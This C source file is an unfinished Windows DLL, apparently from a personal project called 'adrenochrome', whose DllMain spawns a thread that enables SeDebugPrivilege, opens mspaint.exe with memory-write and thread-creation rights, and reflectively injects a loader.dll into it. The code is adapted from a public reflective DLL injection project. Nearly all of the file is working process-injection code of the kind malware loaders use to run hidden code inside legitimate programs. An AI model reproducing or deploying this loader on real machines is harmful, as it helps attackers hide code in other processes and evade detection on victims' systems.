/* should compile into installer_x64.dll or installer_x86.dll depending on target os */
// LoadRemoteLibraryR() equivalent goes in here

// NOTE: 
// to trigger this dlls DllMain, we're currently injecting into notepad.exe.
// we're then attempting to reflectively load loader.dll into mspaint.exe.



#include "LoadLibraryManual.h"
#include "Installer.h"

// TODO: manually resolve all these windows api calls
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include <stdio.h>

#include <tlhelp32.h>
// NOTE: temp helper function for debugging
#include <tchar.h>


DWORD GetPidFromName(const wchar_t* name)
{
	PROCESSENTRY32W pe;
	pe.dwSize = sizeof(PROCESSENTRY32W);

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	if (!Process32FirstW(hSnap, &pe))
	{
		CloseHandle(hSnap);
		return 0;
	}

	do
	{
		if (_wcsicmp(pe.szExeFile, name) == 0)
		{
			DWORD pid = pe.th32ProcessID;
			CloseHandle(hSnap);
			return pid;
		}
	} while (Process32NextW(hSnap, &pe));

	CloseHandle(hSnap);
	return 0;
}



// Adapted from:
// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/Inject.c
DWORD WINAPI start(LPVOID lpParam) // TODO: change to be DWORD WINAPI start(LPVOID lpParam)
{

	MessageBoxA(NULL, "Inside start()", "Debug", MB_OK);

	// do while loop start // TODO: add this if i want the ability to add error handling with break statements?


	// TODO: 
	// look for target.dll within the .data section of the current PE file (installer.dll).
	// if doing this way, i will probs have to parse _IMAGE_SECTION_HEADER and find the start
	// address of the section where i embedded the target.dll (in this case it should be the .data section)
	// PE Format: https://github.com/fancycode/MemoryModule/blob/master/doc/readme.rst


	// look for target.dll on disk?
	char* targetDll = "C:\\Users\\Connor\\Documents\\Code\\C++\\adrenochrome\\x64\\Debug\\loader.dll"; // host.dll

	// process to inject host.dll into
	//const wchar_t* host_process = L"notepad.exe";
	// obtain target process id... TODO: 
	//DWORD dwProcessId = GetPidFromName(host_process);
	//DWORD dwProcessId = GetPidFromName(L"notepad.exe");
	DWORD dwProcessId = GetPidFromName(L"mspaint.exe");
	// DWORD dwProcessId = GetPidFromName(L"CalculatorApp.exe");

	// Display PID in a MessageBoxA
	char buf[128];
	sprintf_s(buf, sizeof(buf), "PID = %lu", dwProcessId);
	MessageBoxA(NULL, buf, "Debug", MB_OK);

	// open dll file that is living on the disk
	HANDLE hFile = CreateFileA(targetDll, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBoxA(NULL, "CreateFileA fails", "Debug", MB_OK);
	}

	// get size of targetDll
	DWORD dwLength = GetFileSize(hFile, NULL);
	if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
	{
		MessageBoxA(NULL, "GetFileSize fails", "Debug", MB_OK);
	}

	// allocate memory to write targetDll into memory
	// NOTE: This is memory is just arbirturary/temporary simply acting
	// as a place where we can "move" the targetDll from on disk and into memory
	LPVOID lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
	if (!lpBuffer)
	{
		MessageBoxA(NULL, "HeapAlloc fails", "Debug", MB_OK);
	}

	DWORD dwBytesRead = 0;
	// reads the entire dll into memory
	// NOTE: here is where we're actually writing the contents of the targetDll
	// from the disk into the memory we just allocated for it on the Heap 
	BOOL successful_read = ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL);
	if (successful_read == FALSE)
	{
		MessageBoxA(NULL, "ReadFile fails", "Debug", MB_OK);
	}

	TOKEN_PRIVILEGES priv = {0};
	HANDLE hToken = NULL;
	// get process token so we can change permissions of the process to allow us to open and inject into another process
	// NOTE: GetCurrentProcess() returns a handle to the host process we injected (installer.dll) into
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		// enable the SedebugPrivellege
		priv.PrivilegeCount           = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			if (AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL) == FALSE)
			{
				MessageBoxA(NULL, "AdjustTokenPrivileges", "Debug", MB_OK);
			}
		}
		CloseHandle(hToken);
	}

	// Opens the target process with rights to write memory and create remote threads
	//HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	// NOTE: giving "full/enough" permissions to the process we're trying to reflectively load our targetDll (loader.dll)
	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
	if (!hProcess)
	{
		MessageBoxA(NULL, "OpenProcess fails", "Debug", MB_OK);
	}

	// Calls LoadRemoteLibraryR to perform reflective DLL injection
	// Loads targetDll into memory
	//hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	// NOTE: LoadLibraryManual() attempts to load our targetDll into the target process using reflective dll injection
	HANDLE hModule = LoadLibraryManual(hProcess, lpBuffer, dwLength, NULL); // TODO: rename
	if (!hModule)
	{
		MessageBoxA(NULL, "LoadLibraryManual fails", "Debug", MB_OK);
	}

	// Waits for the remote thread to finish
	WaitForSingleObject(hModule, INFINITE);
	// do while loop end // TODO: add this if i want the ability to add error handling with break statements?

	// memory cleanup
	if(lpBuffer)
	{
		HeapFree(GetProcessHeap(), 0, lpBuffer);
	}

	if(hProcess)
	{
		CloseHandle(hProcess);
	}

	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		MessageBoxA(NULL, "DLL_PROCESS_ATTACH reached!", "DEBUG", MB_OK);
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		DisableThreadLibraryCalls(hModule);
		// NOTE: this is needed cuz calling start() without using CreateThread
		// could cause loader lock problems 
		// CreateThread(NULL: SecurityAttributes, 0: StackSize, start: function i want to run, NULL: paramter for start function, 0: Create flag settings... should thread run immeditly after creation, NULL: ptr to store thread identifier)
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)start, NULL, 0, NULL);
		if (hThread == NULL)
		{
			char buf[256];
			sprintf_s(buf, sizeof(buf), "CreateThread FAILED: %lu", GetLastError());
			MessageBoxA(NULL, buf, "Error", MB_OK);
		}
		else
		{
			MessageBoxA(NULL, "Thread CREATED successfully", "Debug", MB_OK);
		}
		break;

	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
	case DLL_PROCESS_DETACH:
		if (lpReserved != NULL)
		{
			break; // do not do cleanup if process termination scenario
		}

		// Perform any necessary cleanup.
		break;
	}
	return TRUE;
}

